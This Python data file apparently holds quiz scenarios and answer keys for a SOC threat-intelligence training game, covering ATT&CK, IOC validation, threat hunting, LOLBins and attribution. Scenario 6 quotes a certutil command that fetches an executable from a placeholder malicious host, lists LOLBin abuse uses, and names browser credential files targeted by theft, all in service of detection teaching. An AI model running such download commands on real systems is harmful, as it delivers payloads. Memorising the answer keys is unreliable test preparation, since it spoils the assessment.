"""
Domain 3: Threat Intelligence scenarios.

Key SOC concepts tested:
- MITRE ATT&CK framework
- Pyramid of Pain
- IOC management and validation
- Threat hunting methodology
- Intelligence sharing (STIX/TAXII)
- Attribution and confidence levels
- Living off the Land techniques
- Threat actor TTPs

Each scenario uses a single "standard" professional theme.
"""

SOC_DOMAIN_3_SCENARIOS = [
    # Scenario 1: Pyramid of Pain
    {
        "id": "soc3_pyramid_of_pain",
        "domain": 3,
        "themes": {
            "standard": {
                "title": "INDICATOR INVESTMENT",
                "narrative": """
Your threat intelligence team has limited resources and must prioritize which
indicators to develop detection rules for. You've received intelligence about
a threat actor targeting your industry:

1. IP addresses of known C2 servers (12 IPs, rotated weekly)
2. File hashes of dropped malware (changes with each campaign)
3. Domain names used for phishing (new domains registered daily)
4. TTPs: Uses spear-phishing with macro-enabled documents, establishes persistence
   via scheduled tasks, and moves laterally using PsExec

According to the Pyramid of Pain, which indicators should you prioritize for
detection rules to cause the MOST disruption to the attacker?
                """,
                "choices": [
                    {"text": "IP addresses - they're specific and easy to block"},
                    {"text": "File hashes - they uniquely identify the malware"},
                    {"text": "Domain names - blocking domains stops the phishing"},
                    {"text": "TTPs - detecting the behaviors forces attackers to change methods"}
                ],
                "success_text": """
"TTPs," you recommend. "We should build detections for macro execution from email
attachments, scheduled task creation for persistence, and PsExec-style lateral
movement."

Your threat intel lead explains the Pyramid of Pain:

```
          /\\
         /  \\  TTPs (Tough!)
        /----\\  Tools
       /------\\  Network/Host Artifacts
      /--------\\  Domain Names
     /----------\\  IP Addresses
    /------------\\  Hash Values (Trivial)
```

"At the bottom, hash values and IPs - attackers change these trivially. Recompile
the malware? New hash. Spin up a new VPS? New IP. Our detections become worthless
in hours."

"But TTPs? That's HOW they attack. Making them abandon macros for initial access,
or stop using scheduled tasks for persistence - that forces them to develop new
tradecraft. That takes time, skill, and increases their risk of mistakes."

Your behavioral detections catch the next campaign variant, even though every
hash, IP, and domain was new. The attack METHOD was the same.

TTP PRINCIPLE: Behavioral detection is more resilient than IOC matching. Force
attackers to change HOW they operate, not just WHAT indicators they leave behind.
                """,
                "failure_texts": {
                    0: """
IP addresses are at the BOTTOM of the Pyramid of Pain - trivial for attackers to
change. Block 12 IPs? They spin up 12 new ones on different cloud providers in
an hour.

Your IP blacklist caught the first wave. The second wave sailed right through.

LESSON: IP-based detection provides minimal disruption to sophisticated attackers.
                    """,
                    1: """
File hashes are the very BOTTOM of the Pyramid. Attackers change hashes by adding
a single byte, recompiling, or using polymorphic malware.

Your hash signatures caught exactly zero variants after the first. Same malware
family, different hash.

LESSON: Hash matching provides zero defense against variants.
                    """,
                    2: """
Domain names are slightly better, but sophisticated attackers use DGAs or register
new domains constantly. The intel says "new domains registered daily."

Your domain blocks caught Monday's phishing. Tuesday's used new domains. You're
playing whack-a-mole.

LESSON: Domain blocking requires continuous updates. Behavioral detection is more
resilient.
                    """
                }
            }
        },
        "correct_index": 3,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Pyramid of Pain (David Bianco):
- TRIVIAL: Hash Values
- EASY: IP Addresses
- SIMPLE: Domain Names
- ANNOYING: Network/Host Artifacts
- CHALLENGING: Tools
- TOUGH: TTPs
        """,
        "domain_reference": "SOC Domain 3: Threat Intelligence - Pyramid of Pain"
    },

    # Scenario 2: MITRE ATT&CK Mapping
    {
        "id": "soc3_mitre_mapping",
        "domain": 3,
        "themes": {
            "standard": {
                "title": "TECHNIQUE IDENTIFICATION",
                "narrative": """
Your threat hunting team has discovered suspicious activity on a developer
workstation. The timeline shows:

1. User opened an email with a PDF attachment
2. Adobe Reader spawned PowerShell
3. PowerShell executed an encoded command that downloaded a DLL
4. rundll32.exe loaded the DLL
5. The DLL created a scheduled task named "ChromeUpdateChecker"
6. The scheduled task executes PowerShell at user logon
7. Network connections observed to an external IP on port 443

Your threat intel platform needs MITRE ATT&CK mapping. Which ATT&CK tactic does
step 5 (creating a scheduled task that runs at logon) represent?
                """,
                "choices": [
                    {"text": "Initial Access - the attacker is getting into the system"},
                    {"text": "Execution - the attacker is running malicious code"},
                    {"text": "Persistence - the attacker is maintaining access across restarts"},
                    {"text": "Command and Control - the attacker is communicating externally"}
                ],
                "success_text": """
"Persistence," you confirm. "Specifically, T1053.005 - Scheduled Task/Job:
Scheduled Task."

You map the full attack chain:
- T1566.001: Spearphishing Attachment (Initial Access) - step 1
- T1204.002: User Execution - Malicious File (Execution) - step 2
- T1059.001: PowerShell (Execution) - step 3
- T1218.011: Rundll32 (Defense Evasion) - step 4
- T1053.005: Scheduled Task (Persistence) - step 5
- T1071.001: Web Protocols (Command and Control) - step 7

The scheduled task ensures the attacker's code survives system restarts. That's
the definition of Persistence.

Your threat intel team queries ATT&CK: "Three APT groups use this exact sequence -
APT29, APT32, and FIN7. Let's check for additional indicators from their playbooks."

MAPPING PRINCIPLE: ATT&CK provides a common language for adversary behavior.
Accurate mapping enables threat intelligence correlation and detection gap analysis.
                """,
                "failure_texts": {
                    0: """
Initial Access was step 1 (the phishing email), not step 5. The attacker was
already IN the system when they created the scheduled task.

ATT&CK distinguishes between HOW attackers get in (Initial Access) and WHAT they
do once inside. Scheduled tasks for maintaining access = Persistence.

LESSON: Initial Access describes entry vectors, not post-exploitation activities.
                    """,
                    1: """
Execution was step 4 (rundll32 loading the DLL). Creating a scheduled task
SCHEDULES future execution but isn't execution itself.

Execution detections catch active code running NOW. Persistence detections catch
mechanisms that ensure code runs LATER.

LESSON: Scheduled task creation is Persistence, not Execution.
                    """,
                    3: """
Command and Control was step 7 (network connections). The scheduled task has
nothing to do with network communication - it's about ensuring the malware runs
again after reboot.

C2 describes HOW attackers communicate. Persistence describes HOW they maintain
access. Different tactics, different detection strategies.

LESSON: Don't conflate C2 (communication) with Persistence (survival).
                    """
                }
            }
        },
        "correct_index": 2,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
MITRE ATT&CK organizes adversary behavior:
- Tactics: the WHY (Persistence, Execution, etc.)
- Techniques: the HOW (Scheduled Task, PowerShell, etc.)

Scheduled tasks for maintaining access = Persistence (T1053.005)
        """,
        "domain_reference": "SOC Domain 3: Threat Intelligence - MITRE ATT&CK Framework"
    },

    # Scenario 3: IOC Validation
    {
        "id": "soc3_ioc_validation",
        "domain": 3,
        "themes": {
            "standard": {
                "title": "THE SUSPICIOUS INDICATOR",
                "narrative": """
Your threat intelligence feed provides a new IOC:
- IP Address: 8.8.8.8
- Classification: "Command and Control server"
- Confidence: High
- Source: "Community threat feed"

Before adding this to your blocklist, you decide to validate it. What do you
discover, and what action should you take?
                """,
                "choices": [
                    {"text": "Block immediately - High confidence from a community feed"},
                    {"text": "Investigate first - 8.8.8.8 is Google's public DNS, don't block"},
                    {"text": "Add to monitoring only - watch for connections but don't block"},
                    {"text": "Report the feed as unreliable and unsubscribe"}
                ],
                "success_text": """
You investigate before blocking: "8.8.8.8 is Google Public DNS. This IOC is
FALSE - either an error or intentionally poisoned."

Blocking 8.8.8.8 would have:
- Broken DNS resolution for systems using Google DNS
- Caused widespread outages across your environment
- Created a self-inflicted denial of service

You report the bad IOC to the feed provider and add validation steps to your
IOC ingestion workflow:
1. Check against known-good lists (CDNs, major cloud providers, DNS services)
2. Verify age and rotation - C2 servers typically don't use static public IPs
3. Cross-reference with multiple sources before blocking

Your intel lead adds: "Community feeds are valuable but not infallible. A single
bad IOC can cause more damage than the threat it's supposed to block. Always
validate before action."

IOC VALIDATION PRINCIPLE: Never trust IOCs blindly. Validate against known-good
infrastructure, verify the source, and understand the potential blast radius of
blocking.
                """,
                "failure_texts": {
                    0: """
Blocking 8.8.8.8 blocked Google Public DNS!

Systems across your environment immediately lost DNS resolution. Help desk tickets
flooded in. The "high confidence" IOC just caused a company-wide outage.

LESSON: "High confidence" means the feed is confident in their classification,
not that the IOC is correct. Always validate.
                    """,
                    2: """
Monitoring 8.8.8.8 generates alerts every time any system uses Google DNS - which
is thousands of times per minute in most environments.

Your monitoring dashboard is now 99% noise from legitimate DNS traffic. Real
threats are buried in the flood.

LESSON: Bad IOCs don't become good IOCs by moving them to "monitoring only."
False IOCs should be rejected, not tracked.
                    """,
                    3: """
Unsubscribing from the feed is an overreaction to one bad IOC. Community feeds
make mistakes - that's why validation exists.

The feed provides valuable intelligence 99% of the time. The correct response
is to report the bad IOC and improve your validation process, not to abandon a
useful source.

LESSON: No feed is perfect. Build validation into your workflow rather than
expecting perfection from sources.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
IOC validation checklist:
1. CHECK KNOWN-GOOD - Is this a major service provider?
2. VERIFY REPUTATION - Multiple sources agree?
3. ASSESS BLAST RADIUS - What breaks if we block this?
4. UNDERSTAND CONTEXT - Why is this classified as malicious?
        """,
        "domain_reference": "SOC Domain 3: Threat Intelligence - IOC Validation and Enrichment"
    },

    # Scenario 4: Threat Hunting Hypothesis
    {
        "id": "soc3_threat_hunting",
        "domain": 3,
        "themes": {
            "standard": {
                "title": "THE HUNT BEGINS",
                "narrative": """
You're starting a proactive threat hunt. Recent industry reports indicate that
threat actors are using "browser credential theft" to steal saved passwords from
Chrome and Firefox. No alerts have fired, but you want to hunt for this activity.

What is the BEST approach to develop your hunting hypothesis?
                """,
                "choices": [
                    {"text": "Search for all browser processes and review manually"},
                    {"text": "Hypothesize: 'Attackers access browser credential files' - hunt for file access to Login Data/logins.json"},
                    {"text": "Wait for an alert to fire, then investigate"},
                    {"text": "Run vulnerability scans to find systems with outdated browsers"}
                ],
                "success_text": """
You develop a hypothesis-driven hunt:

HYPOTHESIS: "If attackers are stealing browser credentials, they must access the
credential storage files. In Chrome, this is 'Login Data'. In Firefox, it's
'logins.json' and 'key4.db'."

Your hunt query:
- File access events to paths containing 'Login Data' OR 'logins.json' OR 'key4.db'
- By processes OTHER than chrome.exe, firefox.exe, or known backup tools
- In the last 30 days

Results: 3 hits
- 2 are legitimate backup software (whitelisted)
- 1 is suspicious: mimikatz.exe accessed Chrome's Login Data on a developer workstation

You've found an active compromise that no alert detected. The attacker was using
a renamed Mimikatz binary to harvest browser credentials.

THREAT HUNTING PRINCIPLE: Hypothesis-driven hunting starts with adversary behavior,
not alerts. "If attackers do X, we should see Y" - then hunt for Y.
                """,
                "failure_texts": {
                    0: """
"Search for all browser processes" returns millions of events. Chrome and Firefox
run constantly on every workstation. There's no way to manually review this volume.

Hunting without a hypothesis is just drowning in data. You need to focus on
SPECIFIC behaviors that indicate compromise.

LESSON: Hunting requires a hypothesis. "Look at everything" isn't a hunt, it's
an exercise in futility.
                    """,
                    2: """
"Wait for an alert" isn't hunting - it's reactive monitoring. The whole point of
threat hunting is to find threats that EVADE automated detection.

If your alerts could find it, you wouldn't need to hunt. Hunting exists precisely
because attackers evolve faster than detection rules.

LESSON: Hunting is PROACTIVE. Waiting for alerts is reactive.
                    """,
                    3: """
Vulnerability scanning finds weaknesses in software versions, not active threats.
A fully patched browser can still have its credentials stolen by malware.

Vulnerability management is important, but it's a different discipline than
threat hunting. The threat you're hunting for (credential theft) works regardless
of patch level.

LESSON: Threat hunting finds active threats. Vulnerability scanning finds potential
weaknesses. Different problems, different tools.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Threat hunting methodology:
1. HYPOTHESIS - What behavior indicates compromise?
2. DATA - What logs capture that behavior?
3. HUNT - Search for the behavior in your environment
4. INVESTIGATE - Analyze hits for true positives
5. IMPROVE - Create detections for validated findings
        """,
        "domain_reference": "SOC Domain 3: Threat Intelligence - Threat Hunting Methodology"
    },

    # Scenario 5: Intelligence Source Prioritization
    {
        "id": "soc3_intel_sources",
        "domain": 3,
        "themes": {
            "standard": {
                "title": "SOURCE SELECTION",
                "narrative": """
Your organization is selecting threat intelligence sources. Budget allows for
two paid subscriptions plus free community feeds. The options:

A) Industry ISAC membership ($15K/year)
   - Sector-specific threat intelligence
   - Peer information sharing
   - Early warning of targeted campaigns

B) Commercial IOC feed ($25K/year)
   - 50,000+ IOCs updated daily
   - Automated SIEM integration
   - Global coverage

C) Dark web monitoring service ($20K/year)
   - Alerts when company data appears on dark web
   - Credential breach detection
   - Brand impersonation monitoring

D) APT-focused vendor report subscription ($10K/year)
   - Detailed technical reports on nation-state actors
   - Campaign analysis and attribution
   - Quarterly briefings

Your organization is a regional healthcare provider primarily concerned with
ransomware and data theft. Which TWO sources provide the best value?
                """,
                "choices": [
                    {"text": "A and B - ISAC membership plus broad IOC coverage"},
                    {"text": "B and C - Automated IOCs plus dark web monitoring"},
                    {"text": "A and C - Industry-specific intel plus breach detection"},
                    {"text": "C and D - Dark web monitoring plus APT reports"}
                ],
                "success_text": """
You recommend A (ISAC) and C (Dark web monitoring):

ISAC Membership ($15K):
- Healthcare-specific threat intelligence
- Early warning when other hospitals are targeted
- Peer sharing means you learn from others' incidents
- Ransomware groups targeting healthcare are tracked closely

Dark Web Monitoring ($20K):
- Patient data appearing for sale = active breach
- Credential breaches enable account takeover attacks
- Brand impersonation targets patients with phishing
- Direct relevance to healthcare compliance (HIPAA)

Why NOT B (commercial IOCs):
- 50,000 IOCs daily = noise without context
- Generic global coverage, not healthcare-focused
- ISAC provides more targeted, actionable intel

Why NOT D (APT reports):
- Regional healthcare isn't typically a nation-state target
- Ransomware groups (criminal) are the primary threat
- APT focus is misaligned with actual risk profile

Total: $35K for sector-specific intel and direct breach visibility.

INTEL PRIORITIZATION: Match intelligence sources to your ACTUAL threat landscape.
A healthcare provider needs ransomware and data breach intelligence, not APT reports.
                """,
                "failure_texts": {
                    0: """
Commercial IOC feeds (B) provide volume, not value. 50,000 IOCs daily with no
context about relevance to healthcare? That's noise, not intelligence.

ISAC membership (A) provides the same IOCs PLUS context: "This ransomware group
is actively targeting hospitals. Here's their TTP evolution."

LESSON: Context beats volume. Industry-specific > generic global.
                    """,
                    1: """
Commercial IOCs (B) plus dark web (C) gives you broad coverage but no industry
context. You'll see IOCs without knowing if they're relevant to healthcare, and
dark web alerts without peer context.

Missing ISAC membership means you don't learn when similar hospitals are attacked.
You find out when you're hit, not when you could have prepared.

LESSON: Sector-specific intelligence provides early warning that generic feeds don't.
                    """,
                    3: """
APT reports (D) are fascinating reading but misaligned with your threat profile.
Regional healthcare providers face ransomware gangs, not nation-state actors.

Spending $10K on APT reports while facing ransomware daily is like buying bear
spray in shark-infested waters.

LESSON: Intelligence sources should match your actual threats. Ransomware, not APTs,
is the healthcare sector's primary concern.
                    """
                }
            }
        },
        "correct_index": 2,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Intelligence source selection:
1. THREAT ALIGNMENT - Does this match our actual threats?
2. SECTOR RELEVANCE - Is this specific to our industry?
3. ACTIONABILITY - Can we do something with this intel?
4. COST/VALUE - Does the benefit justify the investment?
        """,
        "domain_reference": "SOC Domain 3: Threat Intelligence - Intelligence Source Prioritization"
    },

    # Scenario 6: Living off the Land
    {
        "id": "soc3_lolbin_identification",
        "domain": 3,
        "themes": {
            "standard": {
                "title": "THE LEGITIMATE TOOL",
                "narrative": """
Threat intelligence reports that attackers are using "Living off the Land"
techniques to evade detection. Your team needs to understand which Windows
binaries are commonly abused.

You see the following process execution in your EDR:

Parent: WINWORD.EXE
Child: certutil.exe -urlcache -split -f http://suspicious.com/file.exe C:\\temp\\update.exe

This is an example of LOLBin (Living Off the Land Binary) abuse. Why is this
technique effective for attackers?
                """,
                "choices": [
                    {"text": "Certutil is unsigned and triggers antivirus alerts"},
                    {"text": "Certutil is a Microsoft-signed binary that typically bypasses security controls"},
                    {"text": "Certutil is faster than downloading files through a browser"},
                    {"text": "Certutil encrypts the download so it can't be inspected"}
                ],
                "success_text": """
"Certutil is a Microsoft-signed binary," you explain. "It's included with Windows
and is trusted by most security tools."

LOLBin effectiveness:
1. SIGNED BY MICROSOFT: Whitelisting and application control often trust signed
   Microsoft binaries
2. ALREADY PRESENT: No need to drop tools - use what's already there
3. LEGITIMATE PURPOSE: certutil.exe is a real certificate management tool
4. BEHAVIORAL BYPASS: AV looks for malware, not Windows tools doing weird things

Common LOLBins and their abuse:
- certutil.exe: Download files, decode base64
- mshta.exe: Execute HTA files from URLs
- regsvr32.exe: Execute scriptlets from URLs
- rundll32.exe: Execute arbitrary DLLs
- bitsadmin.exe: Download files in background

Detection strategy: You can't block these binaries (they're needed for Windows).
Instead, detect ANOMALOUS USAGE:
- Word spawning certutil = suspicious
- Certutil with -urlcache downloading from external IPs = suspicious
- Certutil output to temp folders = suspicious

LOLBin PRINCIPLE: Attackers use legitimate tools maliciously because security
controls trust the tool's signature, not its behavior. Detection must focus on
HOW tools are used, not WHETHER they run.
                """,
                "failure_texts": {
                    0: """
Certutil IS signed - by Microsoft. That's precisely WHY it's useful to attackers.

Unsigned binaries often trigger alerts. Signed Microsoft binaries are typically
whitelisted and trusted. The attacker leverages that trust.

LESSON: LOLBins are SIGNED, TRUSTED, and BUILT-IN. That's what makes them valuable
to attackers.
                    """,
                    2: """
Speed isn't the point. Attackers could easily download files through PowerShell
or other methods.

The value is EVASION. Certutil is a legitimate Windows tool that security products
often ignore. It's not about speed - it's about flying under the radar.

LESSON: LOLBins provide stealth, not performance.
                    """,
                    3: """
Certutil doesn't encrypt downloads - it downloads files in plain HTTPS (or HTTP).
The traffic is inspectable by network security tools.

The evasion comes from the HOST, not the NETWORK. Endpoint detection often trusts
certutil because it's a signed Windows binary.

LESSON: LOLBin evasion is about endpoint detection bypass, not network encryption.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
LOLBin (Living Off the Land Binary) characteristics:
- SIGNED: By Microsoft or other trusted vendors
- BUILT-IN: Pre-installed on Windows
- LEGITIMATE: Has valid business purposes
- ABUSABLE: Can be misused for malicious actions

Detection: Focus on anomalous USAGE, not the binary itself.
        """,
        "domain_reference": "SOC Domain 3: Threat Intelligence - Living off the Land Techniques"
    },

    # Scenario 7: Attribution Confidence
    {
        "id": "soc3_attribution",
        "domain": 3,
        "themes": {
            "standard": {
                "title": "THE ATTRIBUTION QUESTION",
                "narrative": """
After a major incident, your CISO asks: "Who attacked us? I need to tell the board."

Your investigation found:
- Malware with code comments in Russian
- C2 servers in Eastern European hosting providers
- TTPs matching public reports about APT28 (Fancy Bear)
- Attack occurred during Russian business hours

The CISO wants to attribute the attack to Russian state actors in the board
presentation. What is the appropriate response?
                """,
                "choices": [
                    {"text": "Confirm Russian state attribution - the evidence is clear"},
                    {"text": "Report as 'likely Eastern European cybercriminals' without state attribution"},
                    {"text": "Advise caution - indicators can be faked, attribution requires more evidence"},
                    {"text": "Refuse to provide any attribution - it's impossible to know"}
                ],
                "success_text": """
You advise caution: "The indicators SUGGEST Eastern European origin, but they
don't PROVE state sponsorship. Attribution to a specific nation-state requires
much more evidence than we have."

Your explanation:
- Russian code comments: Any attacker can add Russian comments as a false flag
- Eastern European hosting: Attackers use bulletproof hosting regardless of origin
- APT28 TTPs: Publicly documented TTPs can be mimicked by any sophisticated actor
- Business hours: Attackers operate at varying hours, this is weak evidence

Accurate attribution requires:
- Intelligence agency involvement
- Long-term campaign tracking
- Technical evidence beyond publicly known indicators
- Often requires classified intelligence

You recommend: "We can report that the attack used sophisticated techniques
consistent with organized threat actors. Attribution to specific groups or
states is beyond our current evidence."

ATTRIBUTION PRINCIPLE: False attribution is worse than no attribution. Code
comments, hosting locations, and mimicked TTPs are easily faked. Leave definitive
attribution to organizations with appropriate intelligence resources.
                """,
                "failure_texts": {
                    0: """
Confirming "Russian state actors" based on this evidence is irresponsible:

- Legal implications: Attributing to a nation-state could trigger insurance
  clauses, regulatory requirements, or even diplomatic issues
- Reputation risk: If wrong, your credibility is destroyed
- False flags: Sophisticated attackers WANT you to attribute incorrectly

This evidence could be a Russian APT, Russian criminals, or a completely different
actor using false flags.

LESSON: Don't over-attribute. The consequences of incorrect attribution can be
severe.
                    """,
                    1: """
"Likely Eastern European cybercriminals" is still over-attribution. The hosting
location doesn't indicate attacker origin - criminals and APTs both use
bulletproof hosting wherever it's available.

You're guessing based on circumstantial evidence that could easily be false flags.

LESSON: Geographic indicators (hosting, business hours, language) are weak
attribution evidence. They're trivially faked.
                    """,
                    3: """
Refusing any attribution goes too far. You CAN provide context: "Sophisticated
threat actor using techniques consistent with organized groups. Origin uncertain."

Complete refusal to assess doesn't help the CISO communicate to the board. They
need SOMETHING - just not overconfident nation-state attribution.

LESSON: Provide what you CAN support with evidence. Acknowledge uncertainty rather
than refusing all analysis.
                    """
                }
            }
        },
        "correct_index": 2,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
Attribution challenges:
1. FALSE FLAGS - Attackers deliberately plant misleading indicators
2. WEAK EVIDENCE - Language, location, timing are easily faked
3. SERIOUS IMPLICATIONS - Nation-state attribution has consequences
4. REQUIRES RESOURCES - Definitive attribution needs intelligence capabilities

When in doubt, describe the attack, not the attacker.
        """,
        "domain_reference": "SOC Domain 3: Threat Intelligence - Attribution and Confidence Levels"
    },

    # Scenario 8: STIX/TAXII Sharing
    {
        "id": "soc3_stix_taxii",
        "domain": 3,
        "themes": {
            "standard": {
                "title": "INTELLIGENCE SHARING",
                "narrative": """
Your organization wants to automate threat intelligence sharing with your
industry ISAC. They support STIX/TAXII. Your team needs to understand these
standards to implement the integration.

What is the relationship between STIX and TAXII?
                """,
                "choices": [
                    {"text": "STIX and TAXII are competing standards - choose one"},
                    {"text": "STIX defines the intelligence format; TAXII defines how to exchange it"},
                    {"text": "TAXII is the format; STIX is the transport protocol"},
                    {"text": "Both are transport protocols for different types of intelligence"}
                ],
                "success_text": """
"STIX defines the format; TAXII defines the transport," you explain correctly.

STIX (Structured Threat Information Expression):
- Standardized FORMAT for threat intelligence
- Defines objects: Indicators, Threat Actors, Campaigns, Attack Patterns
- Uses JSON structure for machine-readability
- Enables consistent sharing regardless of platform

TAXII (Trusted Automated Exchange of Intelligence Information):
- TRANSPORT PROTOCOL for sharing STIX data
- Defines how to push/pull intelligence between systems
- Server/client architecture (Collections, Channels)
- Enables automated sharing at machine speed

Analogy:
- STIX = the LANGUAGE (like English)
- TAXII = the DELIVERY METHOD (like email)

You need both: STIX tells you how to DESCRIBE threats, TAXII tells you how to
SHARE those descriptions.

Your integration plan:
1. Configure TAXII client to connect to ISAC TAXII server
2. Subscribe to relevant STIX collections
3. Parse incoming STIX objects into your SIEM
4. Publish your own indicators back to the ISAC

SHARING PRINCIPLE: STIX + TAXII enables automated, machine-speed intelligence
sharing. Format (STIX) + Transport (TAXII) = interoperable threat intelligence.
                """,
                "failure_texts": {
                    0: """
STIX and TAXII are COMPLEMENTARY, not competing. They solve different problems
and are designed to work together.

STIX defines WHAT you share (the format). TAXII defines HOW you share it (the
transport). You need both for automated intelligence sharing.

LESSON: They're two halves of a complete solution.
                    """,
                    2: """
You have it backwards:
- STIX = FORMAT (how intelligence is structured)
- TAXII = TRANSPORT (how intelligence is exchanged)

TAXII is not a format - it's a protocol for moving data. STIX is not a protocol -
it's a schema for structuring data.

LESSON: STIX = language, TAXII = delivery. Format vs. transport.
                    """,
                    3: """
Neither is purely a transport protocol:
- STIX is a DATA FORMAT (not transport)
- TAXII is a TRANSPORT PROTOCOL (correct)

STIX defines the structure of threat intelligence objects. TAXII defines how
those objects move between systems.

LESSON: One format, one transport. Together they enable automated sharing.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 50,
        "hp_penalty": 15,
        "failure_text": """
STIX/TAXII overview:
- STIX: Structured Threat Information Expression (FORMAT)
  - How to describe threats, indicators, campaigns
- TAXII: Trusted Automated Exchange (TRANSPORT)
  - How to share STIX data between systems

Together: Automated, machine-readable threat intelligence sharing.
        """,
        "domain_reference": "SOC Domain 3: Threat Intelligence - STIX/TAXII Standards"
    }
]
